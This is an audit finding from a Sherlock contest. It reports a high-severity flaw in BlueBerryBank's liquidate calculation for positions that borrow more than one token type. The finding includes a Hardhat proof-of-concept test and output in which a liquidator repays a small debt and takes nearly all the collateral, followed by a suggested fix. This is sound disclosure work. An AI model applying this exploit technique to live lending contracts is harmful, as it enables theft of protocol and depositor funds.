evan

high

# Liquidate calculations are incorrect when position borrows more than 1 type of token

## Summary
If a position has borrowed more than 1 type of token, then the liquidator (which can be the position owner) will get more collateral tokens and underlying tokens than they are supposed to when they call liquidate.

## Vulnerability Detail
https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L522-L531

^^ Observe that these lines of calculation does not take into account the possibility of the position having multiple types of debt tokens.

## Impact
A malicious user can purposely setup a position borrowing a lot of asset A and a little bit of asset B. When the position becomes liquidatable, the user calls liquidate on the position paying back all the asset B. The user will get all the collateral tokens (ICHI Vault tokens in this case) and underlying tokens without having to pay back the asset A debt. Clearly, the protocol will incur a heavy loss every time this happens. See the proof of concept below.

## Code Snippet
Please put this test in bank.test.ts, and run `yarn hardhat test --grep Vuln1`
```javascript
	describe("Vuln1", () => {
		const depositAmount = utils.parseUnits('100', 18);
		const borrowAmount = utils.parseUnits('300', 6);
		const borrowAmount2 = utils.parseUnits('1', 18);
		const iface = new ethers.utils.Interface(SpellABI);

		beforeEach(async () => {
			await usdc.approve(bank.address, ethers.constants.MaxUint256);
			await ichi.approve(bank.address, ethers.constants.MaxUint256);
			await bank.execute(
				0,
				spell.address,
				iface.encodeFunctionData("openPosition", [
					0,
					ICHI,
					USDC,
					depositAmount,
					borrowAmount
				])
			)
			await bank.execute(
				1,
				spell.address,
				iface.encodeFunctionData("openPosition", [
					0,
					ICHI,
					ICHI,
					0,
					borrowAmount2
				])
			)
		})
		it("borrowing multiple types of token", async () => {
			const positionIds = await bank.getPositionIdsByOwner(admin.address);
			console.log(positionIds);
			await ichiVault.rebalance(-260400, -260200, -260800, -260600, 0);
			let positionInfo = await bank.getPositionInfo(1);
			let debtValue = await bank.getDebtValue(1)
			let positionValue = await bank.getPositionValue(1);
			let risk = await bank.getPositionRisk(1)
			console.log("Debt Value:", utils.formatUnits(debtValue));
			console.log("Position Value:", utils.formatUnits(positionValue));
			console.log('Position Risk:', utils.formatUnits(risk, 2), '%');
			console.log("Position Size:", utils.formatUnits(positionInfo.collateralSize));

			console.log('===ICHI token dumped from $5 to $1===');
			await mockOracle.setPrice(
				[ICHI],
				[
					BigNumber.from(10).pow(17).mul(10),
				]
			);
			positionInfo = await bank.getPositionInfo(1);
			debtValue = await bank.getDebtValue(1)
			positionValue = await bank.getPositionValue(1);
			risk = await bank.getPositionRisk(1)
			console.log("Cur Pos:", positionInfo);
			console.log("Debt Value:", utils.formatUnits(debtValue));
			console.log("Position Value:", utils.formatUnits(positionValue));
			console.log('Position Risk:', utils.formatUnits(risk, 2), '%');
			console.log("Position Size:", utils.formatUnits(positionInfo.collateralSize));

			expect(await bank.isLiquidatable(1)).to.be.true;
			console.log("Is Liquidatable:", await bank.isLiquidatable(1));

			console.log("===Portion Liquidated===");
			const liqAmount = utils.parseUnits("1", 18);
			await ichi.connect(alice).approve(bank.address, liqAmount)
			await expect(
				bank.connect(alice).liquidate(1, ICHI, liqAmount)
			).to.be.emit(bank, "Liquidate");

			positionInfo = await bank.getPositionInfo(1);
			debtValue = await bank.getDebtValue(1)
			positionValue = await bank.getPositionValue(1);
			risk = await bank.getPositionRisk(1)
			console.log("Cur Pos:", positionInfo);
			console.log("Debt Value:", utils.formatUnits(debtValue));
			console.log("Position Value:", utils.formatUnits(positionValue));
			console.log('Position Risk:', utils.formatUnits(risk, 2), '%');
			console.log("Position Size:", utils.formatUnits(positionInfo.collateralSize));

			const colToken = await ethers.getContractAt("ERC1155Upgradeable", positionInfo.collToken);
			const uVToken = await ethers.getContractAt("ERC20Upgradeable", ichiSoftVault.address);
			console.log("Liquidator's Position Balance:", await colToken.balanceOf(alice.address, positionInfo.collId));
			console.log("Liquidator's Collateral Balance:", await uVToken.balanceOf(alice.address));
		})
	})
```
Relevant output of the test:
```plaintext
Cur Pos: [
  '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',
  '0x111111517e4929D3dcbdfa7CCe55d30d4B6BC4d6',
  BigNumber { value: "99500000000000000000" },
  BigNumber { value: "9950000000000000000000" },
  '0x666432Ccb747B2220875cE185f487Ed53677faC9',
  BigNumber { value: "1444340184240050549415016108611883439767302560454" },
  BigNumber { value: "304172983" },
  BigNumber { value: "11607" },
  owner: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',
  underlyingToken: '0x111111517e4929D3dcbdfa7CCe55d30d4B6BC4d6',
  underlyingAmount: BigNumber { value: "99500000000000000000" },
  underlyingVaultShare: BigNumber { value: "9950000000000000000000" },
  collToken: '0x666432Ccb747B2220875cE185f487Ed53677faC9',
  collId: BigNumber { value: "1444340184240050549415016108611883439767302560454" },
  collateralSize: BigNumber { value: "304172983" },
  risk: BigNumber { value: "11607" }
]
Debt Value: 301.0
Position Value: 185.509423928334692619
Position Risk: 116.07 %
Position Size: 0.000000000304172983
Is Liquidatable: true
===Portion Liquidated===
Cur Pos: [
  '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',
  '0x111111517e4929D3dcbdfa7CCe55d30d4B6BC4d6',
  BigNumber { value: "380517502347" },
  BigNumber { value: "38051750234700" },
  '0x666432Ccb747B2220875cE185f487Ed53677faC9',
  BigNumber { value: "1444340184240050549415016108611883439767302560454" },
  BigNumber { value: "2" },
  BigNumber { value: "7883999998257" },
  owner: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',
  underlyingToken: '0x111111517e4929D3dcbdfa7CCe55d30d4B6BC4d6',
  underlyingAmount: BigNumber { value: "380517502347" },
  underlyingVaultShare: BigNumber { value: "38051750234700" },
  collToken: '0x666432Ccb747B2220875cE185f487Ed53677faC9',
  collId: BigNumber { value: "1444340184240050549415016108611883439767302560454" },
  collateralSize: BigNumber { value: "2" },
  risk: BigNumber { value: "7883999998257" }
]
Debt Value: 300.00000000382429652
Position Value: 0.000001219762663328
Position Risk: 78839999982.57 %
Position Size: 0.000000000000000002
Liquidator's Position Balance: BigNumber { value: "304172981" }
Liquidator's Collateral Balance: BigNumber { value: "9949999961948249765300" }
```
Observe that after the liquidation, the debt value barely changed. The position risk went from 116.07 % to 78839999982.57 %, and liquidator got almost all of the vault tokens and underlying tokens after paying very little.

## Tool used
Manual Review
Hardhat

## Recommendation
https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L529-L531
^^ Instead of multiplying by share/oldShare, they should be multiplying by `oracle.getDebtValue(debtToken, amountPaid)/oldTotalDebt`, where oldDebtValue is `getDebtValue(POSITION_ID)` before `repayInternal` gets called.
